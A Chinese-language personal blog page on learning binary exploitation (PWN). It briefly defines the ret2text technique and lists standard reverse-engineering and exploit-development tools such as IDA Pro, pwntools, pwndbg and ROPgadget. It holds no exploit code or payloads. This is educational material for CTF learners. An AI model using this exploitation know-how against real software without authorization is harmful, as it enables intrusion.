<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text即执行程序中已有代码，例如程序中写有system等系统的调用函数，我们就可以利用控制已有的gadgets（以ret结尾的指令序列，通过这些指令序列，可以修改某些地址的内容）控制system函数。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/30/PWN%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/30/PWN%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">PWN常用工具</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-05-30 20:02:57" itemprop="dateCreated datePublished" datetime="2020-05-30T20:02:57+08:00">2020-05-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-06-11 21:01:50" itemprop="dateModified" datetime="2020-06-11T21:01:50+08:00">2020-06-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>开始入坑PWN的学习，本文记录PWN中所使用到的一些工具和软件，保持长期更新。</p>
<h4 id="IDA-PRO"><a href="#IDA-PRO" class="headerlink" title="IDA PRO"></a><a href="">IDA PRO</a></h4><p>交互式反汇编器专业版（Interactive Disassembler Professional），人们常称其为IDA Pro，或简称为IDA。是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器。</p>
<h4 id="x64dbg"><a href="#x64dbg" class="headerlink" title=" x64dbg"></a><a href="https://github.com/x64dbg/x64dbg"> x64dbg</a></h4><p>Windows的开源二进制调试器，旨在对您没有源代码的可执行文件进行恶意软件分析和反向工程。有许多可用功能，还有一个全面的<a href="http://plugins.x64dbg.com/" target="_blank" rel="noopener">插件系统</a>可添加您自己的<a href="http://plugins.x64dbg.com/" target="_blank" rel="noopener">插件</a>。</p>
<h4 id="checksec-sh"><a href="#checksec-sh" class="headerlink" title="checksec.sh"></a><a href="https://github.com/slimm609/checksec.sh">checksec.sh</a></h4><p>Checksec是一个bash脚本，用于检查可执行文件的属性（例如PIE，RELRO，PaX，Canaries，ASLR，Fortify Source）。它最初是由Tobias Klein编写的，其原始资源可以在这里找到：<a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">http</a> : <a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">//www.trapkit.de/tools/checksec.html</a></p>
<p>查看程序的基本信息，主要查看程序开启了什么保护。</p>
<h4 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a><a href="https://github.com/Gallopsled/pwntools">pwntools</a></h4><p>Pwntools是一个CTF框架和漏洞利用开发库。它是用Python编写的，旨在用于快速原型开发和开发，旨在使漏洞利用程序编写尽可能简单。</p>
<h4 id="peda"><a href="#peda" class="headerlink" title="peda"></a><a href="https://github.com/longld/peda">peda</a></h4><p>PEDA-GDB的Python漏洞利用开发协助。和pwndbg冲突，通过修改.gdbinit文件切换。</p>
<h4 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a><a href="https://github.com/pwndbg/pwndbg">pwndbg</a></h4><p>pwndbg是一个GDB插件，它使使用GDB进行调试的工作量减少，重点放在低级软件开发人员，硬件黑客，逆向工程人员和漏洞利用开发人员所需的功能上。</p>
<h4 id="QIRA"><a href="#QIRA" class="headerlink" title="QIRA"></a><a href="http://qira.me/" target="_blank" rel="noopener">QIRA</a></h4><p>程序运行时跟踪调试工具。</p>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></h4><p>使用此工具，您可以在二进制文件中搜索，以方便您对ROP的利用。ROPgadget在x86，x64，ARM，ARM64，PowerPC，SPARC和MIPS体系结构上支持ELF / PE / Mach-O格式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">s0nnse</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">s0nnse</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
